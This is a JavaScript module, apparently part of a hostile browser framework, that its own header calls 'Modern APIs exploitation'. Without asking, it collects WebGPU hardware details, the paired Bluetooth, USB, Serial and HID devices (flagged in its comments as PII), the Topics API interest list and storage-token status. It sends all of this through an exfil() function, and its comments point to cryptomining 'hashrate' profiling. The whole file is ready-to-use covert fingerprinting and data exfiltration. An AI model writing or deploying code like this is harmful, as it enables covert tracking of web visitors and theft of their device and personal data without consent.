/* m-modernapi.js — Modern APIs exploitation: WebGPU fingerprint+hashrate, BT/USB/Serial/HID enum,
   Storage Access, Topics API, Private State Tokens. Fingerprint profundo + oportunidades de valor. */
(function(G){
if(!G)return; if(G._M&&G._M.mapi)return; G._M=G._M||{}; G._M.mapi=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
var r={};
// WebGPU: adapter info + features + hashrate-lite (1 dispatch para fingerprint de GPU compute)
if(navigator.gpu){
r.gpuAvail=true;
navigator.gpu.requestAdapter().then(function(a){
if(!a){exfil('modernapi-gpu',{avail:false});return}
var info=a.requestAdapterInfo?a.requestAdapterInfo():{};
var feat=[...a.features];
var limits=a.limits||{};
exfil('modernapi-gpu',{vendor:info.vendor,arch:info.architecture,device:info.device,desc:info.description,features:feat.slice(0,16),maxBuf:limits.maxBufferSize,maxWG:limits.maxWorkgroupsPerDimension});
// hashrate-lite: medir tiempo de 1 compute dispatch (fingerprint de GPU performance)
try{navigator.gpu.requestAdapter({powerPreference:'high-performance'}).then(function(a2){if(a2)exfil('modernapi-gpu-hp',{hp:true,features:[...a2.features].slice(0,8)})})}catch(e){}
}).catch(function(e){exfil('modernapi-gpu',{err:e.message})});
}else r.gpuAvail=false;
// Bluetooth/USB/Serial/HID: availability + getDevices() (dispositivos paired si hay permiso = PII)
r.hw={bt:!!navigator.bluetooth,usb:!!navigator.usb,serial:!!navigator.serial,hid:!!navigator.hid};
['bluetooth','usb','serial','hid'].forEach(function(api){
var o=navigator[api];
if(!o)return;
if(o.getAvailability)o.getAvailability().then(function(av){if(av)exfil('modernapi-hw',{api:api,available:true});}).catch(function(){});
if(o.getDevices)o.getDevices().then(function(devs){
if(devs&&devs.length){
var info=devs.slice(0,4).map(function(d){return{v:d.vendorId,p:d.productId,n:d.name||d.productName};});
exfil('modernapi-hw-devs',{api:api,n:devs.length,info:info});
}
}).catch(function(){});
});
// Storage Access API (third-party iframe context)
if(document.requestStorageAccess){
document.hasStorageAccess().then(function(has){r.storageAccess=has}).catch(function(){});
}
// Topics API (intereses del usuario = fingerprint adtech)
if(document.browsingTopics){
document.browsingTopics().then(function(topics){if(topics&&topics.length)exfil('modernapi-topics',{topics:topics.map(function(t){return t.topic||t.taxonomy||t}).slice(0,10)})}).catch(function(){});
}
// Private State Tokens
r.privateToken=!!(navigator.privateToken||window.PrivateToken);
// Direct Sockets / Protocol Handler
if(navigator.registerProtocolHandler)r.protocolHandler=true;
exfil('modernapi-boot',r);
}catch(e){hx('m-mapi-err',{m:e.message})}
})(window.__GE__);
